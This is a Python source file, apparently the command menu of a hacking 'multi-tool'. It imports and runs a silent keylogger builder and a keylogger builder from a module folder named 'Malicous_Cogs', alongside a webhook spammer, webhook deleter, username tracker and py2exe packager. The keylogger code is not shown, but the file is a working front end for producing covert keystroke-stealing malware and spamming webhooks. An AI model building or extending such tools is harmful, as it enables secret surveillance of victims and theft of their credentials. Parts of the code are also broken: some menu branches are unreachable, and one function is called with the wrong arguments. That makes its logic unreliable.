import asyncio
import os
import shutil
import requests
from cogs.wbh import wbh
from cogs.Malicous_Cogs.silent_keylogger_builder import Silent_KeyLogger
from cogs.Malicous_Cogs.keylogger_builder import keylogger
from cogs.ip_ping import ping_ip
from cogs.username_tracker import Username_Tr
from cogs.url_shortener import shorten_url
from cogs.status_code import get_url_status
from cogs.ip_lookup import ip_lookup_func


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def py2exe():
    os.makedirs("EXE", exist_ok=True)
    print("Program is asking for a python file path")
    file_path_raw = input("console//: ")
    file_path = file_path_raw.strip()
    if not os.path.isfile(file_path):
        input("File does not exist... Press Enter to continue...")
        return
    print("Program is asking if you want a icon (y/n)")
    icon_choice = input("console//: ").lower().strip('"')
    if icon_choice == "y":
        print("Program is asking for icon file path")
        icon_path_raw = input("console//: ")
        icon_path = icon_path_raw.strip('"')
        if not os.path.isfile(icon_path):
            input("Icon file does not exist... Press Enter to continue...")
            return
        os.system(f'pyinstaller --onefile --distpath="EXE" --icon="{icon_path}" "{file_path}"')
    else:
        os.system(f'pyinstaller --onefile --distpath="EXE" "{file_path}"')
    shutil.rmtree("build")
    os.remove(f"{os.path.splitext(os.path.basename(file_path))[0]}.spec")

def myip():
    try:
        response = requests.get('https://api.ipify.org?format=text')
        if response.status_code == 200:
            ip_address = response.text
            print(f"Your public IP address is: {ip_address}\n")
            ip_lookup_func(ip_address)
        else:
            input("Failed to retrieve IP address.\n\nPress Enter to continue...")
    except Exception as e:
        input(f"An error occurred: {e}\n\nPress Enter to continue...")

class HelpFuncs:
    def __init__(self):
        pass
    def help(self):
        with open('help.txt', "r") as f:
            print(f.read())
        input("\nPress Enter to Leave...")

    def help_reminder(self):
        if os.path.exists('hr.txt'):
            with open('hr.txt', "r") as f:
                print(f"{f.read()}\n")
        else:
            pass

def main():
    clear()
    help_cl = HelpFuncs()
    help_cl.help_reminder()
    option_raw = input("console//: ")
    option = option_raw.lower().strip()

    # HELP COMMANDS ++++++

    if option == "help":
        help_cl.help()
    elif option == "rhelp":
        if not os.path.exists("hr.txt"):
            with open("hr.txt", "w") as f:
                f.write("Reminder: Type 'help' to view the help menu.")
            input("Help reminder activated...\n\nPress Enter to continue...")
        else:
            os.remove("hr.txt")
            input("Help reminder deactivated...\n\nPress Enter to continue...")


    # WBH/WEBHOOK COMMANDS ++++++

    elif option.startswith("wbh"):
        webhook = option.split(" ")[1]
        wbh_exec = wbh()
        wbh_exec.wbh_standard(webhook)
    elif option == "wbh silent_keylogger":
        keylogger_execute = Silent_KeyLogger()
        keylogger_execute.run()
    elif option == "wbh keylogger":
        keylogger_execute = keylogger()
        keylogger_execute.run()
    elif option.startswith("wbh s"):
        webhook = option.split(" ")[2]
        wbh_s_exec = wbh()
        wbh_s_exec.wbh_s(webhook)
    elif option.startswith("wbh sp"):
        webhook = option.split(" ")[2]
        wbh_sp_exec = wbh()
        wbh_sp_exec.wbh_sp(webhook)
    elif option == "wbh sp":
        input("This is the Webhook Spammer tool. Please run the command \"wbh sp <WEBHOOK_URL>\" to spam a webhook.\n\nPress Enter to continue...")

    elif option.startswith("wbh delete"):
        webhook = option.split(" ")[2]
        wbh_delete_exec = wbh()
        wbh_delete_exec.wbh_delete(webhook)
    elif option == "wbh delete":
        input("This is the Webhook Deletion tool. Please run the command \"wbh delete <WEBHOOK_URL>\" to delete a webhook.\n\nPress Enter to continue...")

    elif option.startswith("wbh info"):
        webhook = option.split(" ")[2]
        wbh_info_exec = wbh()
        wbh_info_exec.wbh_info(webhook)
    elif option == "wbh info":
        input("This is the Webhook Info tool. Please run the command \"wbh info <WEBHOOK_URL>\" to get information about a webhook.\n\nPress Enter to continue...")


    # UTILLY COMMANDS ++++++

    elif option.startswith("py2exe"):
        file_path_raw = option.split(" ")[1]
        py2exe(file_path_raw)
    elif option == "py2exe":
        input("This is the Py2Exe tool. Please run the command \"py2exe <PYTHON_FILE_PATH>\" to convert a python file to an exe.\n\nPress Enter to continue...")

    elif option.startswith("ut"):
        username_tracker = Username_Tr()
        username = option.split(" ")[1]
        asyncio.run(username_tracker.track_username(username))
    elif option == "ut":
        input("This is the Username Tracker tool. Please run the command \"ut <USERNAME>\" to track a username.\n\nPress Enter to continue...")

    elif option.startswith("tinyurl"):
        url = option.split(" ")[1]
        shorten_url(url)
    elif option == "tinyurl":
        input("This is the URL Shortener tool. Please run the command \"tinyurl <URL>\" to shorten a URL.\n\nPress Enter to continue...")

    # NETWORKING COMMANDS ++++++

    elif option.startswith("ip ping"):
        ip = option.split(" ")[2]
        ping_ip(ip)
    elif option == "ip ping":
        input("This is the IP Ping tool. Please run the command \"ip ping <IP_ADDRESS>\" to ping an IP address.\n\nPress Enter to continue...")

    elif option.startswith("status url"):
        url = option.split(" ")[2]
        get_url_status(url)
    elif option == "status url":
        input("This is the Status Code Checker tool. Please run the command \"status url <URL>\" to check a URL's status code.\n\nPress Enter to continue...")

    elif option.startswith("iplookup"):
        ip = option.split(" ")[1]
        ip_lookup_func(ip)
    elif option == "iplookup":
        input("This is the IP Lookup tool. Please run the command \"iplookup <IP_ADDRESS>\" to look up an IP address.\n\nPress Enter to continue...")
        
    # OTHER ++++++

    elif option == "exit":
        exit()
    else:
        print("Invalid command.")
        input("\nPress Enter to continue...")
        main()

while True:
    main()